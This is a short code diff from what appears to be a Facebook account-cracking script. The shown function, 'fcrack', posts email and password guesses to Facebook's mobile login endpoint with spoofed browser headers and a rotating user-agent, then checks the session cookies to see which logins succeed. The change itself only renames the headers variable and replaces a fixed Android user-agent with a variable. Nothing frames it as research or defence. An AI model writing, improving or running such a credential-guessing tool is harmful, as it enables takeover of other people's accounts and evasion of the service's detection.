@@ -824,7 +824,7 @@ def fcrack(uid,pwx,tl):
 			"email":uid,
 			"pass":ps,
 			"login":"Log In"}
-			headers = {'authority': 'p.facebook.com',
+			header_freefb = {'authority': 'p.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'viewport-width': '980',
 	'method': 'GET',
@@ -844,7 +844,7 @@ def fcrack(uid,pwx,tl):
     'sec-fetch-site': 'same-origin',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-			'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 14; Pixel 4a (5G) Build/UP1A.231105.001',
+			'user-agent': pro}
 			lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
